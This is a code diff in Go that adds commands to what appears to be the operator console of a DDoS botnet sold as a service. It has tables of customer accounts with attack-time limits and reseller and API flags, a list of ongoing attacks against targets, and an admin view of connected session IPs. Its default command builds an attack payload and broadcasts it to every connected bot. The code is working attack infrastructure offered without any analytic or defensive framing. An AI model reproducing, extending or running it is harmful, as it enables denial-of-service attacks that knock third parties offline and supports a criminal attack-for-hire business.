+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "MaxDaily" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Admin" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Reseller" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "API" + ansiReset},
+				},
+			}
+
+			for _, u := range users {
+				row := []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(u.ID) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(u.Username) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Maxtime, ansiReset)},
+					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Conns, ansiReset)},
+					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Cooldown, ansiReset)},
+					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.MaxDaily, ansiReset)},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.Admin)},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.Reseller)},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.API)},
+				}
+
+				new.Body.Cells = append(new.Body.Cells, row)
+			}
+
+			new.SetStyle(simpletable.StyleCompactLite)
+			colored := colorTableBorders(new.String())
+			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
+			continue
+
+		case "ongoing": // Global ongoing attacks
+
+			new := simpletable.New()
+			new.Header = &simpletable.Header{
+				Cells: []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Target" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Duration" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Finish" + ansiReset},
+				},
+			}
+
+			ongoing, err := OngoingAttacks(time.Now())
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Cant fetch ongoing attacks" + ansiReset + "\r\n"))
+				continue
+			}
+
+			for i, attack := range ongoing {
+				row := []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(i) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(attack.Target) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(attack.Duration) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(attack.User) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%.2fsecs%s", ansiNumbers, time.Until(time.Unix(attack.Finish, 0)).Seconds(), ansiReset)},
+				}
+
+				new.Body.Cells = append(new.Body.Cells, row)
+			}
+
+			new.SetStyle(simpletable.StyleCompactLite)
+			colored := colorTableBorders(new.String())
+			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
+			continue
+
+		case "sessions":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
+				continue
+			}
+
+			new := simpletable.New()
+			new.Header = &simpletable.Header{
+				Cells: []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "IP" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Admin" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Reseller" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "API" + ansiReset},
+				},
+			}
+
+			for i, u := range Sessions {
+				row := []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(i) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(u.User.Username) + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiPrimary + strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":") + ansiReset},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.Admin)},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.Reseller)},
+					{Align: simpletable.AlignCenter, Text: FormatBool(u.User.API)},
+				}
+
+				new.Body.Cells = append(new.Body.Cells, row)
+			}
+
+			new.SetStyle(simpletable.StyleCompactLite)
+			colored := colorTableBorders(new.String())
+			session.Conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
+			continue
+
+		default:
+			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
+			if !ok && attack == nil {
+				session.Conn.Write([]byte(fmt.Sprintf("%sUnknown command:%s %s%s%s\r\n", ansiError, ansiReset, ansiCommands, strings.Split(strings.ToLower(command), " ")[0], ansiReset)))
+				continue
+			}
+
+			// Builds the attack command into bytes
+			payload, err := attack.Parse(strings.Split(command, " "), account)
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + fmt.Sprint(err) + ansiReset + "\r\n"))
+				continue
+			}
+
+			bytes, err := payload.Bytes()
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + fmt.Sprint(err) + ansiReset + "\r\n"))
+				continue
+			}
+
+			BroadcastClients(bytes)
+			parts := strings.Fields(command)
+			target := "unknown"
+			duration := "?"
+			if len(parts) > 1 {
+				target = parts[1]
+			}
+			if len(parts) > 2 {
+				duration = parts[2]
+			}
+			bots := strconv.Itoa(len(Clients))
+			face := purpleGradientText("X_X")
+			session.Conn.Write([]byte(ansiSuccess + "Successfully" + ansiReset + " " + ansiCommands + "sent attack to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
+		}
+	}
 }
